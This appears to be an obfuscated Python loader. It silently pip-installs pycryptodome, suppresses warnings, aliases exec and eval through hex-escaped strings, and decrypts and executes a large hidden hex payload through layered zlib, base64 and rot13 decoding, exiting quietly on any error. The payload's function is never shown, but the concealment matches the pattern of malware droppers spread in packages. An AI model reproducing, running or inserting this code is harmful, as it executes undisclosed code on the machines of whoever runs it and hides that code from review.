import random ,base64,codecs,zlib,sys;py=""
import warnings, subprocess

def check_installation(package):
    try:
        subprocess.run(["pip3", "show", package], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        return True 
    except subprocess.CalledProcessError:
        return False

package_name = "pycryptodome"

warnings.filterwarnings("ignore", category=Warning)

if not check_installation(package_name):
    subprocess.run(["pip3", "install", package_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
try:
    sys.setrecursionlimit(1000000000) 

    pyobfuscate = (lambda **kwargs: (list(kwargs.keys()),list(kwargs.values())))(**{'https://pyobfuscate.com':'IndexError -+ locals','exec':'z0qYqNf6Hf3FwbzdgrAUfORpyPrCgidzLGAGd9p6MCiRuo2HqZ6pQekqLuNN3HsmeQPUdLIPWHjeiUY8','eval': bytes.fromhex('''3e34dbc81417e29e00d23ac131d261049bf431145e6c44cb756e44b98b728ab012709bbb4322dc644cd58014f5e3ac5c49d5a6992d262aa80c91a2b38ebacb09e0b2cf1f41bf7dd5c427dde7460f1e4133cb977fa013279c91782cd213759d82bb5796dc259e87ca9e638fcb73cd18e4c24800a23d6999604bdf052953819958c0f92c1c9e2562e060289eae3154e0753766943850f72a44ee1181230d58955ac0bfd06b60a469568b32f14a0123fa4afd5f6ccd6fafbacb90f0786d044c680f267ed92f673973a0cffb37bca6b182cfbc18fa18a4c01748cb613ed4642110968d834d484ae8e9934cb6c4aa0ab789c21a520a2f009d31ae638d479925646fcff5504564a8272037400cba37f4d876ca39cc86dfa8ba34a18f2060032dd64d4a6ec52804ba92772612c0243b23c50f22c889b55504698c8cc9d55b2ff8b40f69f41771ffe9e4684f1739503e1612034051a46261372ea132df38f78c826dbf8f020cb4592abeebda5764aa17480f84aaf059780376bef2b7a2bd55c2e7a3144da2e2f2bb9cf0797f09c4713c606d50948e5ffe1e7fbd11c7ae23cf7395fd7112476b89a48f0f2b83e9ca442471b07d7dcbe4d7cc01bfbc0774af867d696bcc8c81b1e18e772d18852db9c1d88f749aec25a81ddc1678153c76c08d51a9370aeecacf509c2c14b3423c80413d9feb0aaf434007b077d70013e189786e82e9f3d59a3f225d4ab611783f33c6130d23c2f6580fbfe132f17be19d63e2f02410a8588df9259c6710a9ae156d9bec3f6bb5c41b14757b84768f8b9cfe73ca60cbc335cf2daf543f435427966dcffe627762d9781bbaefb11630a4fde24bbd93d1c1c32167fa6c0777bdf0382bc0fdad8a0122200a7cae59c87c71963978db1dae98d3ac1d1b52243330d2b83e55dc99d1d21444a8476bd6ba50a478e1eb8b2ef92c9f511610bbc3953689fb5f0dc2df0159241b7a124477f0a1190fb04d1051db699f720d735215ebab8c76ad7375baae19ea90ec974d2b934c62060876e94c701150c97e72dc5dc2269726ce5bff7d234453c3f08d9b1a495192304b8aea4cb112e601f8ded409219031fc22b883c22d7a0f2b7e294cb023f176e61a0321e73a7983bf7be69eee7e8ce904b6977f9410c8e9f6f86bb9d649267592b596d1887f9f559488427941eabf3cbb94cf517f7735d8002dfbb07dc831dcac2e74e301aef9a557a5f4d8e1875950032e9be827ce50b4aa094c3f2fb0b6643b78906b28b022fa420098cf39e2c72e88670aeae97dec0fd2d310786d1121f4386984e0cdc4c824fd3789776c73f3670fe649dbcff2a72ef2a3ed126839388f4e0d6e1cb9c14e75ecbc401610f99d721fb7c9408f3f9dd911b02429d4aadb75ebfba0103b6b79b6371a666bc94a9d2e4f7d108566b1fc6db652f5a2ad8a5da2ca2474e6bc86323d9fa4d6b454b12afa868da369cd974fa914f42a8c5b606210bfb8be501c42b8a6905550ac9df00e6b5d5688249b0ed8e13a4c08d03b678bb35a777540308f2088c77efb1b542c0afcf263eeaaf389ec686b340d912dd7ec42504204c462e21b5f1391324973a0114666e5298216e61c9a89ed701e82dd5c7a1de4a45280b4aa2ba64f3c605f9a813c63042dadc41404081f210ece973bd5b873945e54e64d8ffec08b370f63848a2eddb38261bfd520f8fd607a18b592fb918cf5b59de7ecbf49addcba3dfa753126c641106638c7110a7409596225d27d1593d5d2fc5b2298b635bde20d460876002c60b80780aa00778718943c3f3efea04392177091df55f90616f28303b7c65ae04c78e96825e645ac5b9107418008f0245ae6e6740d1f6d3fb7f96ca45acec082e12edca2eb02f43896dc86538d9f1b487cfca538433eb385dcc6229c4834f3c2a7b7c92419dbd678e00965fc70df1226a7dfb9d400802cd80dd5cb91e793b7ac724614da9ffaf75c1bbd222d590b2dabc915b8d8f776d47143e99747db62009f6f9dd59917b7dd964f4bdad45d506e41b1f5a552a52cb42a3af707ec114734e7d9adada9d835b3c7d90976d73b4f0b8f5cc2a013c368717075e177b72654e82164a777dea93eb437f73c30038304042e1b37d5c7a6731975187b28f0dc32db5da9050f78e2faedd8e23c3aa6ae48a6a1fcf1f96d77e8853ecc1a783bf566811c023231b166149c3ff3789571a9f3262706dd1895108f348e367a1b29e7f7f68bd44e91a9d96eeb626d59a4faadf81cb96fda3068838426661c12b0614f5e4a09a18e75323a6b14834e91686d478db226ebb8246b7e6d208895c02d838ef36d72c121c0a2ff2a403847c8ba47839213f61598e34b9eceac3d27604deadbb7e9e4c62a2cf47df6c18728a8ca238dffcf8588931f9ebe80ce7e3f869a38966dcb1c1c350e3e85b29fa189fa9050c554056d1d2d919229e6ee1fac144228267dba9c891089b8ec9f6618b9915b7f268e639caf553304721984de6c09dbd7b8f6610bd14a8be7329a3a7ed29e5ddba79c830b4fa4dba13a517223bef29178b9b285d60dc9f5a0400e8bbf3c692e4133a58a6306d0040ff62cf47abb78dc5d28aec05689f4669000b42b2178d4188838273ab264e93988b36ae04f529d3928c711f95e9a45e6b9be36dd28e2c67f5a5866750f1c80bfcc005db7c4442d3b96da57c399c1e440e4bd58f43e6a3c732bca62036749ab9269d7699bfb186e429a3fdecc0c1848172e97b1da308a92cff742e0eb866d78949aa83a9af781925cf1c700f99e554a6aa33df6f2fa220e30be3b597008a3d686f1b36336eb7c7156c90b6aa719427b6b1495154983fbda5856ee07c145ce6de64b1a5f56961e9882ccdba23afe1f70be9e5cc1df73fb4141ee450450ff877724d375567aa621c34182dd6a30c91f35348b54f0ba2c621d723c4f8c8974863d09f18f3ea7d21491e4eab8b4ff31c3a8ca241ce0227a17e8de96ba416c1b1b24c1afe1c4c3cb18c33b019a0544baada94107e965d66ffee1af607509d05781141c43153f54a668e2fee2b942518d84b9fe5c9f8155d40292172fd171f8eab547d0542246d02108f4dabfab18439924603df44fddce69cd71fba630bc4e9ac76bf315a85eb9f8b2ecc1b7d0408c73d8c633f0bea17658f39a460558c40218e9e031387fd0ef924880e350ee9e954aa82a28a22078661508939a43da761442058a65adebb0d528a646c28fe4ac3c6b6e34ed9e1db3f9227fef9f6de726b0d653afddd6af61897bcc7dafbd1aba3175a5399b4a1b2bd5ad6fcd741e2eb657dd980dd1ddf57c3dcd773bbf46f90697dd96993e93f9a18f1e9d523044695580d15f47c29d9cb51d045c2f2048c0e86b3892801cf96cd122b0ce7806c9bfc94438883045c45546a70f18b983ca299c0da690c6aa4aebcc527c41d20c7bc7f870efc76e223027da9745e6dd6f8044cb6df2ef970d2261aeaed9b349e111eaff618a9cff14a1cf194be58bdd1d138ca04076b5626b5d9d1bc772f756ce87527cf75f9818490c440078181ef349
    ee934ebcd4b1db6b945d1c2536eb93610ebc81875c772934ef9fc57aa0a336feca1703031b01b202aa9384768c2a8e36eb080ed1438e66c5c2cdd277c1ab985fde2e316f1ab8d9d30fe48c54fb029bd374fd0f82ed63edaa536e8929df6c612979e38359deaed661e95eedf6c18ef1e17687fabbd9a0d2cb92888869c3bb57221c43a7de0bf38473f322bc4c3b4f56e9bbd0204838609fc265fb32de793479d40da6b801df41cad34b261d84571e461ac515c0e7a4382ca537ed9d065f9da993a596d64c78969cc72a42341228a905e636845f7ee2546806122dfc66117d8c8f523f62cabfda8e83c102c72f37eb96aff01d01c7c38f319bcb2ca128dc614e5d15535cb8a08ed36c0505e7e0f46ecc728c39c78553fd98a2ec4a5e14e115138ad3ec72a22fdba50d112db3721afdc0ef779603c566ba371d22f0d23c326100d3406dbed23b5c99ff9eb5c159346990362c4cd29f800f15f8f7a92b90f345e6e415c11a9857db40b3a902b03558629f32dfbbdf478ae00c11f2049bd98377b7c7b1e7e41b863686b92c7ffd3319c1aa2b51793adefa31587d9ec5359bf447ba6f56b71aca32423bcc30cbbcc49ffe4f71abee758eb2b613632f3b48812fd34e034a62daf46f0b763ac59e538bbc3d8d426baf75f1946848d328ea9089955c152a388192642260ab91b25b5d16f9f56eb62a532693c36b37294f96e20afec4be52495aeeac520b2020936e39a43580b97616f2bc0612660f85a8d33208daf2bf5a00502e2ece71e881bb25024d38750f2c817bba98d8d8dfe5c11470e6b3a8e1a1257ede0fad4646338f2fb547bb4d27887bc47b0a3960e91e60e3dd6f66b680199506f3e0757ed37fc10c31ef64ce11b73b8dc34a639392faf4f6ef939fc90326865416ecf45f53ad7323bede8a75db198034a6311d5a4b60e0794170c6d19b8280397e24e60071ebbfccfc2cbe22b555d0e437e63c72b13d0a19a4e9e6ea68b5bb03776040811df39ea318889a50c231289984d51de6c55ab0f96172682cc71367a78c6e3afca80b113eb92a45d290c02fd1442304ffecf02cedab4fb667457d56ab92d8b74b02e0b6348c7260f4418722a4fe8bea13014dca583de55c115aafc2264ae15e6f06b9a12240e7f717c3462d854da4de29854f70fb0ab735dc780cffa8ee0be636c904371c277c75b858c7ac0560aac2ff199d86596ac48c9f4da5b9289281c190408b79d7d2499a5d33098b5eb0fb76f3cc6919da7e98a690e87280b854ad66cec457002fd05e15a9bdac613dcba11e4d9b60b0f76755aa63c26ceb9f8c5096e7464822e0d288374f69ca2e65d5c893ab0f6676a8e7b7da75908a77295a5c8d545f120a7c30d71be860f8f3ba2677dd8a65ac5da30d5451f2b5ccf4c9af2779dfbda1da38aad7'''.replace("\n","")) })

    _=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='173340 8805560 896154 1313092 2579318 789730 639744 257568 342528 2087616 2921076 4804986 6045060 9043621 825024 10964520 165236 10846079 7787403 5794673 5243655 299744 4538705 1367584 664545 6389362 10310720 9037509 7260204 3508768 653344 4463196 3208164 8624020 519530 6131205 7261440 4221063 1381882 6542480 4191892 498104 902270 320544 1697728 3039584 634528 7135856 1776462 1987965 967780 8944064 478680 3175192 3985072 4425435 10842048 1325728 7531440 7633010 5469975 1958892 4943120 5254416 4120092 1846784 1527714 7404714 10891392 9482031 8608937 1154255 9061224 1344465 2946950 2578613 3627143 5550195 3078790 5353600 331344 10291172 812960 1380026 7764848 5969382 5929609 362135 9281650 1440224 8175344 4208490 11217200 4794167 3007092 1178912 11069300 2271948 760160 4902795 804000 5517225 1789996 1516706 741321 4934996 1758309 2770440 1351875 8995800 359760 1477189 951180 181760 3479628 8529192 1587342 5133108 934755 1248856 1406160 1704386 8452184 10446148 3049408 8412656 11119810 1758908 3089686 1021498 9698528 5677683 10506594 192276 2354874 5461560 7644050 7106616 9152823 1089820 7449457 4295710 9534888 288267 6200901 2646758 3672592 6379120 2942600 4417671 1003174 2970612 10663030 2005416 3542756 8935320 2747460 2720034 2113058 1165272 4704612 6906077 7357080 5260484 336340 755160 6032766 6132159 1203094 77220 1732608 1854816 2815872 1970496 6815538 8029362 8617818 3163834 1564512 930846 3031055 181516 3260320 5728820 1546976 9100520 740000 7965930 8766543 10715040 6323559 5994690 1169164 1185536 566711 6388440 7032795 9826175 6728000 5532075 2583136 2931146 8405350 1619872 5879917 5016720 926550 2118496 3039936 1393344 727712 2516034 6586692 7821615 4410358 524576 7927176 5657655 1877632 5866665 7819006 10541440 1572759 4490688 2847916 2985984 813185 5925367 4485488 7177060 7200490 3422826 2657632 8254118 10564705 1563744 3411772 2394104 2061576 5512698 8648630 8651875 6691857 7866824 7225944 341040 115168 2461408 1892736 2048736 6437016 6276051 95634 501054 6113256 6333811 466080 2948985 846560 1669600 4671840 3008728 4262635 98280 1889095 1744275 1755374 3454686 8880704 1578927 5198115 8601012 10791309 5382432 2436896 1595654 4111848 5106092 5949689 5632770 6470360 3818828 5255612 3011880 10668172 2981664 4272485 9900464 205650 1949682 703728 5179038 1896444 3653065 2196094 1743308 3842012 4473588 7319060 5451206 1492424 3905952 4672560 3002312 697714 1109967 5291776 2804439 1548729 5403888 10338762 925452 4092181 2829990 6361616 3835572 4719923 2463289 9747055 1062950 678454 7926048 5279280 4518432 11968 386490 631840 2649152 1818368 2263936 2380832 329700 5344494 2636032 4348252 808080 1355880 1742832 1808051 707250 5317126 1565138 226800 10811874 9121905 1697507 2532802 641890 1702592 923808 1214848 2609888 2912320 987520 675008 3024608 7376712 5365322 4477066 5118543 3318868 299768 3844560 8749328 772436 3216901 5420 2566816 1867872 1405152 1125952 8029298 868428 10079160 3219120 1489120 8910220 496680 3599520 3528112 3003650 2780497 2540772 4462943 2447928 7969170 722007 4832446 5683014 346320 1151008 1722496 2352128 2965408 1188128 3167776 2512416 966080 10928154 5252606 8128675 465090 3124050 351682 796400 6614160 960700 2179314 658690 219936 2439968 2776128 1162688 3669435 2449428 2950304 9276749 3374520 3104000 11132240 3961374 545259 3273443 358741 6605060 3092942 10152000 4178525 180083 2362166 46690 2587136 177824 2894688 689920 2751584 1276544 2648288 3129632 1765841 9990750 3758632 7037264 796352 7664772 644896 3605397 657360 1030320 10002470 897492 7808202 2996120 918064 162894 1239471 3436180 3194232 2711296 2371024 311149 1360288 1846395 7323545 251744 9497030 148480 9319876 4303024 9047570 4703754 9365265 5626116 4798106 1910240 10078830 7144092 9834324 1653440 8642562 5062500 2781030 1635326 782240 2229568 1040608 802784 809984 6763768 11433480 1505809 1679931 1201560 5953818 10601808 7089190 5075510 448280 6688304 2111000 4030997 4081580 8018874 3351685 6049211 7803900 3757400 1161571 2562172 495520 2928896 3056576 406880 171936 118670 9409362 7237560 322542 1423797 139104 11566940 2242744 507990 29472 428640 1702240 1983808 10029199 9099840 8076061 7080084 3203200 4696896 7679232 1763451 943270 890070';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJyLKi/JcnL3M3UKLDFxCizIigosMY1yrzAGAGYBCAQ=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kMtugzAURH8pOKCGpSPiBoOjIFxj2AFteIRXWhtsf33dtOruzGikmXuzYSlZmcnZnLoZeSPBoeKp/xU5hyo26Uhe411uGID0pGPgK4LkNgPL+6IlNHwyf6tvE2Z/2ukXE47LINc4ghpuQRtv8e4/S1nNkacIhh2h54qje/+JvPcZ6JZTWC2rrOcyqCZ0cDlSghh/YFSJCbsCj+perL04JsLNrxev2MSNJYX348Hk4kZI1bkJ29+dwvao+ghCl+CiegDp8b3uHqiRizl/2I2SUN2SodlNVI8cSGe6Ptl66mUxqb3Hb/ISaoKDqkBqzeyvvgEFpGq5")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')

except Exception as e:
    exit()